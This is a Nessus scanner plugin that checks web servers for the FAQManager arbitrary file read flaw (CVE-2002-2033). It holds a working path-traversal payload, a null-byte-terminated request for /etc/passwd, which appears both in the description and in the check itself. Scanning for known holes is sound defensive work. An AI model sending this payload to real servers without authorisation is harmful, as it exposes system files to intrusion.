#
# This script was written by Matt Moore <matt.moore@westpoint.ltd.uk>
#
# See the Nessus Scripts License for details
#
# Changes by Tenable:
# - Revised plugin title, added OSVDB ref, changed example domain (1/05/2009)


include("compat.inc");

if(description)
{
 script_id(10837);
 script_cve_id("CVE-2002-2033");
 script_bugtraq_id(3810);
 script_xref(name:"OSVDB", value:"699");

 script_version ("$Revision: 1.12 $");
 script_name(english:"FAQManager Arbitrary File Reading Vulnerability");
 
 script_set_attribute(attribute:"synopsis", value:
"Arbitrary files may be read on the remote host." );
 script_set_attribute(attribute:"description", value:
"FAQManager is a Perl-based CGI for maintaining a list of Frequently 
Asked Questions. Due to poor input validation it is possible to use 
this CGI to view arbitrary files on the web server. For example:" );
 script_set_attribute(attribute:"see_also", value:"http://www.example.com/cgi-bin/faqmanager.cgi?toc=/etc/passwd%00" );
 script_set_attribute(attribute:"solution", value:
"A new version of FAQManager is available at:
www.fourteenminutes.com/code/faqmanager/" );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );
 script_end_attributes();

 
 summary["english"] = "Tests for FAQManager Arbitrary File Reading Vulnerability";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2002-2009 Matt Moore");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

# Check starts here

include("http_func.inc");
include("http_keepalive.inc");
port = get_http_port(default:80);

no404 = get_kb_item(string("www/no404/", port));
if (no404)
  exit(0);


if(get_port_state(port))
{ 
 req = http_get(item:"/cgi-bin/faqmanager.cgi?toc=/etc/passwd%00", port:port);
 r = http_keepalive_send_recv(port:port, data:req);
 if("root:" >< r)	
 	security_warning(port);

}
